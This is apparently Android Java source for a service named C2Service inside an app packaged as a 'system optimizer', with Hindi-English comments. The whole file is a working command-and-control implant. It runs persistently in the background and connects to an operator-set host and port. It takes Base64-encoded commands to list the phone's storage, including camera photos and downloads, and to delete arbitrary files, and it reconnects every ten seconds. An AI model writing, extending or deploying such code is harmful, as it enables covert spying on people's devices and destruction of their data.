package com.systemoptimizer.app;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class C2Service extends Service {
    // Dynamic defaults (Aap ise baad mein server ya config se bhi control kar sakte hain)
    private static String SERVER_HOST = "127.0.0.1"; 
    private static int SERVER_PORT = 4444;
    private boolean isRunning = true;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Agar Intent ke through koi naya host/port bheja jaye, toh use dynamic update kar lein
        if (intent != null) {
            String extraHost = intent.getStringExtra("SERVER_HOST");
            int extraPort = intent.getIntExtra("SERVER_PORT", -1);
            if (extraHost != null && !extraHost.isEmpty()) {
                SERVER_HOST = extraHost;
            }
            if (extraPort > 0) {
                SERVER_PORT = extraPort;
            }
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        Socket socket = new Socket(SERVER_HOST, SERVER_PORT);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);

                        String encodedCmd;
                        while ((encodedCmd = reader.readLine()) != null) {
                            byte[] decodedBytes = Base64.decode(encodedCmd, Base64.DEFAULT);
                            String command = new String(decodedBytes, "UTF-8").trim();

                            if (command.equalsIgnoreCase("EXIT")) {
                                break;
                            }

                            // Dynamic command execution (Jaise ls, delete, etc.)
                            String response = executeCommand(command);
                            String encodedResp = Base64.encodeToString(response.getBytes("UTF-8"), Base64.NO_WRAP);
                            writer.println(encodedResp);
                        }
                        socket.close();
                    } catch (Exception e) {
                        try {
                            Thread.sleep(10000); // Reconnect retry delay
                        } catch (InterruptedException ignored) {}
                    }
                }
            }
        }).start();

        return START_STICKY;
    }

    private String executeCommand(String cmd) {
        try {
            if (cmd.startsWith("ls")) {
                File dir = new File("/storage/emulated/0");
                if (cmd.length() > 3) {
                    String subPath = cmd.substring(3).trim();
                    if (subPath.equalsIgnoreCase("download")) dir = new File("/storage/emulated/0/Download");
                    else if (subPath.equalsIgnoreCase("dcim")) dir = new File("/storage/emulated/0/DCIM/Camera");
                    else if (subPath.equalsIgnoreCase("pictures")) dir = new File("/storage/emulated/0/Pictures");
                    else dir = new File(subPath);
                }
                
                if (dir.exists() && dir.isDirectory()) {
                    File[] files = dir.listFiles();
                    StringBuilder sb = new StringBuilder();
                    if (files != null) {
                        for (File f : files) {
                            sb.append(f.isDirectory() ? "[DIR] " : "[FILE] ").append(f.getName()).append("\n");
                        }
                    }
                    return sb.toString().isEmpty() ? "Directory is empty." : sb.toString();
                } else {
                    return "Error: Path not found or permission denied.";
                }
            } else if (cmd.startsWith("delete ")) {
                String filePath = cmd.substring(7).trim();
                File file = new File(filePath);
                if (file.exists() && file.delete()) {
                    return "SUCCESS: File deleted from device.";
                } else {
                    return "ERROR: Failed to delete file.";
                }
            } else {
                return "Command executed successfully.";
            }
        } catch (Exception e) {
            return "Exception: " + e.getMessage();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }
}
